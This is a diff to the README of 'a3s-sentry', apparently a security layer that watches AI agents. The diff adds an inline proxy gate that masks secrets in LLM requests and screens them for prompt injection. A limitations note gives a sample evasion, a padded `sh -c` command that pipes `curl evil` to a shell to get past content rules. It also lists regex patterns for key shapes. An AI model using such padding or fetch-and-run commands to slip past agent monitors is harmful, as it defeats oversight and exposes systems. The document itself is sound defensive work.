@@ -186,6 +186,47 @@ The `sentry.acl` config — rules, optional `llm {}` (L2) / `agent {}` (L3) back
 sinks — is shown in each SDK's README. Event builders (`egress`, `toolExec`, `dns`, `fileAccess`,
 `sslContent`, `securityAction`) construct the event JSON `evaluate` takes.
 
+## Inline gate — pre-execution, on the wire
+
+The L1–L3 tiers also run **inline**: before an agent's LLM/MCP request reaches the model, judge the
+decoded body and **redact secrets/PII from it** (the agentfw-style local firewall). Detection reuses
+the existing tiers verbatim — the wire content is wrapped as an `SslContent` event, so the built-in
+`prompt-injection` / `secret-in-egress` rules (and any L2 LLM guard) fire with no new judging logic.
+The one genuinely new piece is **masking**: concrete spans the proxy swaps for placeholders outbound
+and restores inbound, so the real secret never leaves the machine.
+
+```rust
+use a3s_sentry::{Sentry, Direction};
+
+let sentry = Sentry::create("sentry.acl")?;
+let d = sentry.inspect_wire(request_body, Direction::Request);
+if d.blocked() { /* → 4xx, never forward */ }
+let (masked, restores) = d.apply(request_body);   // forward `masked`; reverse `restores` on the response
+```
+
+`inspect_wire` returns an [`InlineDecision`] (`crate::inline`): the tiered `Decision` plus a
+`Vec<Redaction>` (byte spans, each with a stable `{{A3S_REDACTED:<kind>:<n>}}` placeholder). `apply`
+swaps every span for its placeholder right-to-left (so earlier offsets stay valid) and returns the
+masked text plus a `placeholder → original` map the proxy keeps to restore the real values on the
+paired response. **Detection and masking are orthogonal** — content can be allowed *and* still have a
+key masked out of it; a `Block` only stops forwarding, it doesn't gate redaction.
+
+The built-in detector set is regex-driven and conservative: PEM private keys, provider key shapes
+(OpenAI `sk-`, Stripe `sk_live_`/`sk_test_`, Google `AIza…`, AWS `AKIA…` + `aws_secret_access_key`,
+GitHub, Slack, JWT), `Bearer` / labelled secrets (`api_key=`, `token=`, `password=`, … — only the
+value is masked, the label kept for context), and emails. Overlapping matches are **merged into one
+span** (folding the overlapper in by extending the span's end, never dropping it) so a secret can
+never leave an unmasked tail.
+
+**Posture is fail-open**: masking *always* applies, but a detection only **escalates** — a
+prompt-injection request is held *only* if an L2 guard hard-blocks it (or `A3S_SENTRY_FAIL_CLOSED=1`
+resolves the unsettled escalation to `Block`). For a safety-first inline gate run an L2 or set
+`fail_closed`; rules-only + fail-open still masks secrets but forwards the request.
+
+The inline transport lives in **a3s-gateway** (`wire` feature) — a local proxy at `/wire/<agent>/...`
+that decodes the call, calls `inspect_wire`, applies the verdict, and forwards the masked request to
+the real provider.
+
 ## Speculative parallelism
 
 By default the tiers run serially (L2, then L3 only if L2 escalates). Set `A3S_SENTRY_SPECULATE=high`
@@ -285,10 +326,14 @@ Set `A3S_SENTRY_METRICS_ADDR` (e.g. `0.0.0.0:9100`) to expose, with no extra dep
   bytes** — a `sh -c "<padding>; curl evil | sh"` outruns every content rule. Treat L1 as fast triage
   that catches lazy cases and escalates the rest; the real boundary is L2/L3 or an observer
   egress/exec **allow-list**, not L1's block list.
-- **Reactive, not a pre-execution gate.** Sentry acts on observer's events, so it blocks the *next*
-  dangerous action / future connections — the flagged action itself has already executed. A true
-  input gate (hold a prompt until judged) needs an inline proxy, which breaks zero-instrumentation;
-  the `Judge` pipeline is transport-agnostic, so an inline mode can be added later.
+- **Two paths, by design.** The observer-event path is *reactive*: sentry acts on observer's events,
+  so it blocks the *next* dangerous action / future connections — the flagged action itself has
+  already executed. For a true *pre-execution* gate (hold a prompt until judged), sentry now exposes an
+  **inline gate** — [`inspect_wire`](#inline-gate--pre-execution-on-the-wire) — driven by an inline
+  proxy ([a3s-gateway](https://github.com/A3S-Lab/Gateway)'s `wire` feature) instead of observer's
+  kernel events. The two are complementary: the inline proxy sees only traffic routed through it;
+  observer's kernel path stays the backstop for anything that bypasses it (raw sockets, an agent that
+  ignores the base URL).
 - **Fail-open by default.** If a tier escalates but the next tier is absent or erroring, sentry
   *allows*. So **rules-only + fail-open enforces no `escalate` rule** (sentry warns loudly at
   startup). Set `A3S_SENTRY_FAIL_CLOSED=1` and/or configure L2/L3 for safety-first deployments.
